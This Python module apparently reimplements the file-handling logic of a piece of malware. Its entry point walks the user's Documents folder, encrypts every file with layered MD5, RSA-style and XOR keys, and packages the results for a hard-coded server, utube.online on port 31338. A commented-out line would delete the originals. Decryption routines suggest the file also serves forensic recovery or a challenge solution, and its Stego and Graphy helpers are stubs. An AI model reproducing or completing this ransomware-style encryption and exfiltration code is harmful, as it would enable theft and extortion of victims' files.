import os
import uuid
import base64
from io import BytesIO
from Crypto.Hash import MD5

from .graphy import Graphy  # Assumes Graphy class from earlier
from .stego import Stego    # Placeholder: You must implement this based on your C# version
import operator

def xor(data: bytes, key: bytes):
    return bytes([operator.xor(b,key[i % len(key)]) for i, b in enumerate(data)])


class BlockParser:
    def __init__(self,block):
        self.offset = 0
        self.total_len = len(block)
        self.data = block
    
    def parse_block(self):
        i_bye = self.data[self.offset:].find(b'\n\n') 
        content_len = self.data[self.offset:self.offset+i_bye+1].decode().strip()
        assert content_len.isnumeric()
        content_len = int(content_len)
        self.offset +=i_bye+1
        stream_read = self.data[self.offset:self.offset+1]
        assert stream_read == b'\n'
        self.offset +=1
        content = self.data[self.offset:self.offset+content_len]
        self.offset+=content_len
        if self.total_len-self.offset >3:
            stream_read = self.data[self.offset:self.offset+1]
            self.offset +=1
            assert stream_read == b'\n'
        else:
            stream_read = self.data[self.offset:self.offset+3]
            self.offset +=3
            assert stream_read == b'end'
        return content

    def deserialize_block(self):
        encrypted_key_key2_xored = self.parse_block()
        enc_filename_xored = self.parse_block()
        encrypted_content = self.parse_block()
        return encrypted_key_key2_xored,enc_filename_xored,encrypted_content

class CorpClass:
    @staticmethod
    def decrypt_file(buffer: bytes,xor_key: bytes):
        encrypted_keys, encrypted_filename, encrypted_content = BlockParser(buffer).deserialize_block()

        file_path = xor(encrypted_filename,xor_key).decode()
        assert file_path.endswith('.enc')
        file_path = file_path[:-4]

        key_stream = xor(encrypted_keys,xor_key)
        key2_index = key_stream.find(b'<RSAKeyValue')
        key2 = key_stream[key2_index:]
        encrypted_key = encrypted_keys[:key2_index]

        key1 = Stego.xml2key(key2)
        derived_key = Stego.decrypt(encrypted_key,key1)

        derived_key_b64 = base64.b64encode(derived_key).decode()
        decrypted_content = Graphy.decrypt(encrypted_content, derived_key_b64)

        return file_path,decrypted_content


    @staticmethod
    def encrypt_file(file_path: str, key: bytes):
        # Generate temporary keys using Stego.CreateKeys
        key1, key2 = Stego.create_keys(1024)  # Must return (str, str)

        # Read file data
        file_data = open(file_path, "rb").read()

        # Generate key material using MD5(Guid.NewGuid().ToByteArray())
        guid_bytes = uuid.uuid4().bytes
        md5 = MD5.new()
        md5.update(guid_bytes)
        derived_key = md5.digest()  # 16 bytes
        derived_key_b64 = base64.b64encode(derived_key).decode()

        # Encrypt file content with Graphy
        encrypted_content = Graphy.encrypt(file_data, derived_key_b64)

        # Encrypt the derived key with Stego
        encrypted_key = Stego.encrypt(derived_key, key1)

        # XOR key2 with user key

        key2_xored = bytes([operator.xor(ord(c),key[i % len(key)]) for i, c in enumerate(key2)])

        # Send data to server
        host = "utube.online"
        port = 31338

        stream = BytesIO()

        total_len = len(encrypted_key) + len(key2_xored)
        stream.write(f"{total_len}\n".encode("utf-8"))
        
        stream.write(b'\n')

        stream.write(encrypted_key + key2_xored)
        
        stream.write(b'\n')

        # XORed filename
        enc_filename = os.path.basename(file_path) + ".enc"
        enc_filename_xored = bytes([operator.xor(ord(c) , key[i % len(key)]) for i, c in enumerate(enc_filename)])
        stream.write(f"{len(enc_filename_xored)}\n".encode("utf-8"))
        
        stream.write(b'\n')

        stream.write(enc_filename_xored)
        
        stream.write(b'\n')

        # Send encrypted file content byte-by-byte
        stream.write(f"{len(encrypted_content)}\n".encode("utf-8"))
        
        stream.write(b'\n')

        stream.write(encrypted_content)
        stream.write(b'end')
        stream.seek(0)
        buffer = stream.read()
        stream.close()
        return buffer
        #os.remove(file_path)

    @staticmethod
    def decrypt_files(buffers: list,xor_key: bytes):
        for buffer in buffers:
            file_path,decrypted_content = CorpClass.decrypt_file(buffer,xor_key)
            with open(file_path,'wb') as of:
                of.write(decrypted_content)
            print(f'Wrote {len(decrypted_content)} bytes to {file_path}')
        

    @staticmethod
    def encrypt_files(directory: str, key: str):
        out_data = []
        try:
            for root, dirs, files in os.walk(directory):
                for name in files:
                    file_path = os.path.join(root, name)
                    try:
                        buff_data = CorpClass.encrypt_file(file_path, key)
                        out_data.append(buff_data)
                    except:
                        continue
        except:
            pass
        return out_data

    @staticmethod
    def entry_point(arguments: str) -> int:
        docs_dir = os.path.join(os.path.expanduser("~"), "Documents")
        encrypted_data = CorpClass.encrypt_files(docs_dir, arguments)
        return encrypted_data



